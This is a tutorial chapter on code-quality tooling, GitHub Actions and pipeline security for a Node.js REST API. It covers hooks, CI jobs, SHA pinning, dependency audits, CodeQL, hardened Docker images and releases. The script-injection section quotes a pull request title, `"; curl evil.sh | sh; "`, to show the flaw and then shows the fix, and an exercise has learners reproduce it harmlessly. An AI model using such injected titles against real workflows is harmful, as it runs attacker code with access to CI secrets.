**Git hooks** are scripts Git runs at certain moments. **Husky** installs them when you run
`npm install`:

- **pre-commit** runs **lint-staged**: ESLint and Prettier on the files you staged only, so
  it takes seconds.
- **commit-msg** runs **commitlint** on your message.
- **pre-push** runs the type checker.

Anyone can skip hooks with `git commit --no-verify`. That's fine: hooks are a convenience that
catches problems early, and CI is the real gate.

**Conventional Commits** gives every commit message the same shape, `type(scope): summary`:

```
feat(auth): add logout from all devices
fix(workspaces): return 404 for a malformed id
docs(learning): add chapter 3
```

The history becomes readable at a glance, and tools can generate changelogs and pick the next
version number from it (`feat` means a new minor version, `fix` a patch, `!` a major). CI
checks every commit of a pull request, and a small workflow of its own, `pr-title.yml`, checks
the title. It runs again whenever the title is edited: re-running an old check wouldn't help,
because a run always uses the title it started with.

### Concept 6: How a GitHub Actions workflow works

A **workflow** is a YAML file in `.github/workflows/`. It says **when** to run (`on:`), and
what to run as **jobs**. Each job runs on a fresh virtual machine (a **runner**), in parallel
with the other jobs, as a list of **steps**. A step is either a shell command (`run:`) or a
reusable **action** (`uses:`). Our `ci.yml` runs five jobs at the same time:

```
pull request ─┬─ Format, lint and types
              ├─ Commit messages
              ├─ Tests and coverage ──── with a Postgres service container
              ├─ Dependency audit
              └─ Docker image ─────────── build → migrate → start → call the API → scan both images
```

Some details worth knowing:

- **Service containers** (`services:`) start a throwaway Postgres next to the job, the same
  way `docker compose` does on your machine.
- **Concurrency:** a new push to a pull request cancels the run still checking the old commit.
- **Timeouts:** every job has `timeout-minutes`, so a hung job can't run for 6 hours
  (rule 2 again).
- **Job summary:** the coverage table is written to `$GITHUB_STEP_SUMMARY`, so it shows up on
  the run's page.
- **Reusable workflow:** `ci.yml` also has `on: workflow_call`, so the release workflow reuses
  it instead of duplicating it.

### Concept 7: Securing the pipeline itself

CI runs code with access to your repository, so it's a favorite target for attackers. Four
habits protect it:

1. **Least privilege.** Every workflow starts with a read-only token:
   `permissions: contents: read`, or `read-all` in `scorecard.yml`, as in Scorecard's own
   example: it reads many parts of the repository, and writes none. A job that needs more
   asks for exactly that: CodeQL gets `security-events: write`, the image job
   `packages: write`. If a step of a read-only job is compromised, it can't push code. The one
   job that can write to the repository (it creates the GitHub release) runs no action and no
   code from the repository, only the GitHub CLI, so no third-party code ever holds that
   token.
2. **Pin actions to a commit SHA.** `uses: actions/checkout@v7` points to a _tag_, and tags
   can be moved. In March 2025, attackers moved the tags of the popular
   `tj-actions/changed-files` action to malicious code that printed CI secrets into public
   logs, in thousands of repositories. A commit SHA can't be moved:
   `uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1`. Dependabot
   updates the SHAs for us.
3. **Never paste untrusted text into a script.** Anyone can open a pull request with the
   title `"; curl evil.sh | sh; "`. If a workflow does `run: echo "${{ github.event.pull_request.title }}"`,
   that title becomes part of the script. So the title goes through an environment variable,
   which the shell treats as data:

   ```yaml
   env:
     PR_TITLE: ${{ github.event.pull_request.title }}
   run: printf '%s\n' "$PR_TITLE" | npx --no -- commitlint
   ```

4. **Don't leave credentials lying around.** By default `actions/checkout` keeps the token on
   the runner after cloning, so later Git commands can use it. Since checkout v6 it sits in a
   credentials file under `$RUNNER_TEMP` that `.git/config` points to. Any later step could
   read it from there, so `persist-credentials: false` tells checkout not to keep it.

CodeQL also scans the workflow files (the `actions` language), and OpenSSF Scorecard checks
all of this every week.

### Concept 8: Your dependencies are your code

`package-lock.json` lists about 500 packages. Any of them can have a vulnerability, or be
taken over by an attacker. Each layer catches something different:

| Tool                   | What it does                                                                                           |
| ---------------------- | ------------------------------------------------------------------------------------------------------ |
| `npm ci` + lockfile    | Installs exactly the locked versions, and checks each download against its hash                        |
| `npm audit`            | Fails CI if a production dependency has a known high or critical vulnerability                         |
| `npm audit signatures` | Verifies every package was signed by the npm registry, so it wasn't modified                           |
| Dependency review      | Blocks a pull request that adds or updates a vulnerable dependency, or brings in an unexpected license |
| Dependabot             | Opens weekly pull requests with updates, and immediate ones for security fixes                         |
| `overrides`            | Forces a fixed version of a nested dependency when its parent hasn't updated yet                       |

We used the last one already. `npm audit` reported a known vulnerability in `minimatch`, a
package that `eslint-plugin-sonarjs` depends on. SonarJS hadn't released a fix, so
`package.json` tells npm to use a fixed version anyway:

```json
"overrides": { "eslint-plugin-sonarjs": { "minimatch": "^11.0.9" } }
```

Licenses matter too: dependency review only allows licenses that are compatible with a
project shipped under MIT.

Development dependencies count. Dependency review checks only production (runtime)
dependencies unless you ask for more, but ESLint plugins and test tools run on your machine and
in CI, with access to the code. So `fail-on-scopes` includes development dependencies too.

### Concept 9: Static analysis for security with CodeQL

Linters look at code patterns. **CodeQL** goes further: it builds a database of the whole
program and follows how data flows through it. It knows that `request.body` is controlled by
the user, and reports when that data can reach a dangerous place (a raw SQL string, a file
path, a redirect) without being cleaned on the way. It runs on every pull request and every
Monday, because new queries can find problems in code that hasn't changed. Results appear in
the repository's **Security** tab and as annotations on the pull request.

### Concept 10: A hardened Docker image

The image got several upgrades:

- **Node.js 26 LTS.** Even-numbered Node.js versions become LTS (long-term support), and
  production should run one. Node.js 22 stops getting security fixes in April 2027, so we
  moved to 26, the current Active LTS line. `.nvmrc`, CI and the Dockerfile all use it.
- **Pinned by digest.** `FROM node:26-alpine@sha256:6bd9…` is an exact, unchangeable image.
  The tag `node:26-alpine` alone would give you a different image every week. Dependabot
  opens a pull request when a new digest is published, so you still get updates, but
  reviewed and tested.
- **Smaller.** `@prisma/client` lists the Prisma CLI as an _optional peer dependency_, so
  `npm prune --omit=dev` kept the CLI and Prisma Studio in the image. Adding `--omit=optional`
  took `node_modules` from 357 MB to 107 MB. Less code shipped is less code that can have a
  vulnerability.
- **No npm in production.** The final stage deletes npm, npx, corepack and yarn: the app
  never installs anything at runtime. Alpine's own package manager, `apk`, stays, but only
  root can use it, and the container runs as the unprivileged `node` user. The stage also
  runs `apk upgrade` to install the latest Alpine security fixes.
- **Two images, both hardened.** The migration image needs the Prisma CLI, which is a
  development dependency, so it is bigger. It's published too, so it gets the same
  treatment: it runs as `node`, gets `apk upgrade`, deletes npm and starts the CLI directly
  (`node_modules/.bin/prisma migrate deploy`) instead of through `npx`, and it is scanned.
  The first CI run showed why the npm part matters. npm carries its own copies of the
  packages it uses, and Trivy found six high-severity vulnerabilities in two of them
  (`brace-expansion` and `undici`) in the migration image, which still had npm. The API
  image, without npm, was clean.
- **A smoke test in CI.** "It builds" doesn't mean "it runs". The Docker job runs the
  migration image against a real Postgres, starts the API image, waits for
  `/health/ready`, and registers a user. That catches a missing file, a native module built
  for the wrong system, or a migration that fails.
- **A vulnerability scan.** **Trivy** lists every package in each image (Alpine packages and
  npm packages) and compares them with vulnerability databases. CI fails on any high or
  critical vulnerability that has a fix available.

### Concept 11: Releases: versions, changelog, tags

A **release** is a version of the API that you can deploy and refer to later.

- **Semantic Versioning** (`MAJOR.MINOR.PATCH`): for an API, MAJOR means existing clients
  must change (a field renamed), MINOR adds something backward-compatible (a new endpoint),
  PATCH fixes a bug.
- **CHANGELOG.md** follows [Keep a Changelog](https://keepachangelog.com): changes are written
  under `[Unreleased]` as they're merged, and moved under a version heading at release time.
  It's written for humans: "Added", "Fixed", "Security", not a dump of commit messages.
- **A Git tag** (`v1.2.0`) marks the exact commit that was released. Pushing it starts
  `release.yml`, which checks that the tag matches `package.json` and `CHANGELOG.md`, reruns
  the whole CI pipeline on that commit, publishes the API and migration images to GitHub
  Container Registry, and creates a GitHub release with the changelog notes.

The images are published with **provenance** (a record of how and where they were built:
which workflow, from which commit) and an **SBOM** (software bill of materials: the list of
every package inside). Both are attached to the image, which tells you what's in it. They
aren't signed, though, so they aren't _proof_: someone who could push to the package could
replace the image and its provenance together. Signing them (with GitHub's artifact
attestations or Sigstore's cosign) is what lets anyone verify where an image came from. That's
an exercise below.

### Concept 12: The documents of a professional repository

| File                              | Why it exists                                                                         |
| --------------------------------- | ------------------------------------------------------------------------------------- |
| `README.md` badges                | The project's health at a glance: CI status, security score, license, versions        |
| `CONTRIBUTING.md`                 | How to set up, the workflow, the rules and how to release: onboarding in one page     |
| `SECURITY.md`                     | How to report a vulnerability _privately_, so it's fixed before it's public           |
| `CODE_OF_CONDUCT.md`              | How people are expected to treat each other, and what happens if they don't           |
| `CHANGELOG.md`                    | What changed in each version, for the people who use the API                          |
| Issue forms and PR template       | Every bug report has the steps to reproduce; every PR has a test plan and a checklist |
| `CODEOWNERS`                      | GitHub automatically asks the right person to review                                  |
| `LICENSE`                         | What others may legally do with the code                                              |
| `.editorconfig`, `.gitattributes` | Same indentation and line endings on every editor and operating system                |

Some protections are settings, not files. In the repository settings: **rulesets** that
require CI to pass before merging into `main`, **secret scanning with push protection**
(GitHub refuses a push that contains an API key), **private vulnerability reporting** (the
form SECURITY.md links to) and **Dependabot alerts**.

### Build it yourself

1. Install Prettier, add `.prettierrc.json`, run `npx prettier --write .` and look at the
   diff.
2. Install ESLint and typescript-eslint. Start from `strictTypeChecked`, run
   `npx eslint .` and fix what it finds, one rule at a time.
3. Switch on the strict `tsconfig.json` options one by one, and fix the errors each one
   shows you. Which one found the most problems?
4. Add the Power of Ten rules to `eslint.config.js`, with a comment saying which rule each
   line enforces.
5. Write `no-recursion.js` with its `RuleTester` tests. Start with the test cases.
6. Create `limits.ts`, wire each limit into Fastify and the Prisma adapter, and write
   `input-bounds.test.ts`.
7. Add Husky, lint-staged and commitlint. Try committing with the message `stuff`.
8. Write `ci.yml` with just the tests job, open a pull request, watch it run. Then add the
   other jobs one at a time.
9. Add CodeQL, dependency review, Scorecard and Dependabot, pinning every action by SHA.
10. Write `release.yml`, then the documents: CONTRIBUTING, SECURITY, CHANGELOG, templates.

### Exercises

1. **Break the rules.** Write a recursive `factorial(n)` in `src/`, and a `while (true)`
   loop. Run `npm run lint`. Then rewrite both to pass, and explain the bound you chose.
2. **Indirect recursion.** Extend `no-recursion.js` to catch `a` calling `b` calling `a` in
   the same file. Hint: build a map from each function to the names it calls, then look for
   a cycle with an explicit stack (no recursion in the rule itself!).
3. **Find the limits.** Write tests showing that a 65 KB body gets `413` and a 321-character
   email gets `400`. Which limit catches each one?
4. **Script injection lab.** In a repository of your own, write a workflow that runs
   `echo "${{ github.event.pull_request.title }}"`, and open a pull request titled
   `x"; echo INJECTED; echo "`. Find `INJECTED` in the log. Then fix it with an environment
   variable and check again.
5. **Read a scan.** Build the image and scan it locally:
   `docker build -t api . && docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy image api`.
   Then scan `node:26` (not Alpine). Why is the difference so big?
6. **Make a release.** Follow "Releasing" in CONTRIBUTING.md to publish `v1.0.0`, and watch
   each job of the release workflow. (`package.json` already says `1.0.0`, so skip the
   version bump.)
7. **Sign the images.** Add `actions/attest-build-provenance` to the images job (it needs
   `id-token: write` and `attestations: write`), make a release, and verify an image with
   `gh attestation verify oci://ghcr.io/<owner>/production-rest-api:1.0.0 --owner <owner>`.
8. **Clean up history.** Write a job that deletes refresh tokens that expired more than a day
   ago, at most 1,000 rows per run. Postgres has no `DELETE ... LIMIT`: select the ids first.
   Should it run inside the API on a timer, or as its own scheduled job, like the migration
   image? What happens if two copies of the API run it at the same time?
9. **Think about it.** Why does the release workflow rerun CI instead of trusting the pull
   request's green check? Why ban `while` but allow `for...of`? Why is a high coverage
   number not proof that the code is well tested?

### Words to know

quality gate · shift left · formatter · linter · type-aware linting · static analysis ·
cyclomatic complexity · cognitive complexity · AST · invariant · assertion ·
bounded resource · Git hook · Conventional Commits · CI/CD · workflow · job · step · runner ·
service container · least privilege · SHA pinning · script injection · supply chain ·
lockfile · CVE · dependency review · CodeQL · Trivy · LTS · image digest · smoke test ·
Semantic Versioning · changelog · provenance · SBOM
